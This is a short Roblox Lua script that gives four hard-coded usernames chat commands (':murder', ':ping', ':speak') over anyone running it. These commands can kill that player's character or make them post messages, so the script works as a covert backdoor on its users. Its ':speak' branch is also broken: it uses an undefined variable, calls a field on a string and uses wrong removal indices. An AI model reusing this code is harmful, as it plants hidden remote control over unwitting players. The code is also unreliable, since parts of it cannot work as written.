     function Chat(msg)
   if game.ReplicatedStorage:FindFirstChild('DefaultChatSystemChatEvents') then
       game.ReplicatedStorage.DefaultChatSystemChatEvents.SayMessageRequest:FireServer(msg, "All")
   else
       game:GetService("TextChatService").TextChannels.RBXGeneral:SendAsync(msg)
   end
end
adminlist = {"BrillifulPigeon", "ReverbArgalia", "azuresfrie_nd", "teriothej"}
for i,plr in pairs(game.Players:GetPlayers()) do
   plr.Chatted:Connect(function(msg)
if table.find(adminlist, plr.Name) and string.find(msg, ":murder") then
		   if string.find(msg, game.Players.LocalPlayer.Name) then
			   game.Players.LocalPlayer.Character.Humanoid.Health = 0
		    elseif string.find(msg, "others") then
                        if not table.find(adminlist, game.Players.LocalPlayer.Name)  then
                           game.Players.LocalPlayer.Character.Humanoid.Health = 0
			            end
		     end
elseif table.find(adminlist, plr.Name) and string.find(msg, ":ping") then
		   if string.find(msg, game.Players.LocalPlayer.Name) then
			   Chat("@PINGED!")
		    elseif string.find(msg, "others") then
                        if not table.find(adminlist, game.Players.LocalPlayer.Name)  then
                           Chat("@PINGED!")
			            end
		     end
elseif table.find(adminlist, plr.Name) and string.find(msg, ":speak") then
local split_result = string.split(message," ") -- split message every space
local KICK_ARGUMENT_MINIMUM = 3 -- must be (x) or more arguments to succeed
if #split_result < KICK_ARGUMENT_MINIMUM then error("Must be at least 3 arguments") end
if split_result[1] == ":speak" then
    local plr = split_result[2]
    table.remove(split_result,1)
    table.remove(split_result,2)
    if plr.Name == game.Players.LocalPlayer.Name then
		Chat(split_result[3])
	end
end
end
   end)
end
